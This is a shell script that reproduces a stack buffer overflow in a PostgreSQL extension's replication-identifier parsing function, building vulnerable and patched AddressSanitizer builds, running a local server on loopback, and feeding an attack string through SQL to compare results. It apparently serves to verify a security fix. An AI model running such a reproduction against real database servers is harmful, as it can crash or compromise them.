#!/bin/sh
# The plain vulnerable SQL call overflows the stack object but PostgreSQL's
# elog(ERROR) longjmp avoids the stack canary check. This variant preloads
# the ASan runtime into the loopback postmaster so the write itself is
# observed inside a live PostgreSQL backend, reached through SQL.
set -u
cd "$(dirname "$0")" || exit 1
PGBIN=${PGBIN:-/tmp/pgactive-build/pg16root/usr/lib/postgresql/16/bin}
PGINC=${PGINC:-/tmp/pgactive-build/pg16root/usr/include/postgresql/16/server}
PORT=${PORT:-58418}
ROOT=${PWD}
PGDATA=${ROOT}/pgdata-asan
SOCK=${ROOT}/sock-asan
mkdir -p evidence "$SOCK"
rm -rf "$PGDATA" evidence/asan-server.log evidence/asan-fixed-server.log

gcc -O0 -g -fPIC -fstack-protector-strong -fsanitize=address -shared \
    -I"$PGINC" parser.c -o parser-asan-vuln.so 2>evidence/asan-build-vuln.log
gcc -O0 -g -fPIC -fstack-protector-strong -DFIXED_BUILD -fsanitize=address -shared \
    -I"$PGINC" parser.c -o parser-asan-fixed.so 2>evidence/asan-build-fixed.log
echo "ASAN_BUILD=$?"

"$PGBIN/initdb" -D "$PGDATA" -A trust --no-sync --no-instructions >evidence/asan-initdb.log 2>&1
echo "ASAN_INITDB=$?"
LD_PRELOAD=$(gcc -print-file-name=libasan.so) \
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 \
"$PGBIN/pg_ctl" -D "$PGDATA" -l "$ROOT/evidence/asan-server.log" -w start \
    -o "-p $PORT -k $SOCK -c listen_addresses=127.0.0.1" >evidence/asan-pgstart.log 2>&1
echo "ASAN_PGSTART=$?"
PSQL="$PGBIN/psql -h $SOCK -p $PORT -d postgres -X -q -v ON_ERROR_STOP=1"

$PSQL -v libdir="$ROOT/parser-asan-vuln.so" -f setup.sql >evidence/asan-vuln-setup.out 2>&1
echo "ASAN_VULN_SETUP=$?"
ATTACK=$(cat evidence/attack-name.txt)
$PSQL -c "SELECT * FROM pgactive_parse_replident_name('$ATTACK');" \
    >evidence/asan-vuln-attack.out 2>&1
echo "ASAN_VULN_ATTACK_PSQL_RC=$?"

"$PGBIN/pg_ctl" -D "$PGDATA" -m immediate -w stop >evidence/asan-crash-stop.log 2>&1
echo "ASAN_CRASH_STOP=$?"
LD_PRELOAD=$(gcc -print-file-name=libasan.so) \
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 \
"$PGBIN/pg_ctl" -D "$PGDATA" -l "$ROOT/evidence/asan-fixed-server.log" -w start \
    -o "-p $PORT -k $SOCK -c listen_addresses=127.0.0.1" >evidence/asan-fixed-pgstart.log 2>&1
echo "ASAN_FIXED_PGSTART=$?"
$PSQL -c 'DROP FUNCTION pgactive_parse_replident_name(text);' >evidence/asan-fixed-drop.out 2>&1
echo "ASAN_FIXED_DROP=$?"
$PSQL -v libdir="$ROOT/parser-asan-fixed.so" -f setup.sql >evidence/asan-fixed-setup.out 2>&1
echo "ASAN_FIXED_SETUP=$?"
$PSQL -c "SELECT * FROM pgactive_parse_replident_name('pgactive_123_1_2_3_');" \
    >evidence/asan-fixed-safe.out 2>&1
echo "ASAN_FIXED_SAFE=$?"
$PSQL -c "SELECT * FROM pgactive_parse_replident_name('$ATTACK');" \
    >evidence/asan-fixed-attack.out 2>&1
echo "ASAN_FIXED_ATTACK_PSQL_RC=$?"

"$PGBIN/pg_ctl" -D "$PGDATA" -m fast -w stop >evidence/asan-pgstop.log 2>&1
echo "ASAN_PGSTOP=$?"
echo '--- vulnerable attack client ---'; cat evidence/asan-vuln-attack.out
echo '--- fixed attack client ---'; cat evidence/asan-fixed-attack.out
echo '--- ASan server evidence ---'
grep -E 'AddressSanitizer|WRITE of size|replication_name|pgactive_parse_replident_name' evidence/asan-server.log || true
grep -E 'AddressSanitizer|WRITE of size' evidence/asan-fixed-server.log || echo FIXED_SERVER_CLEAN
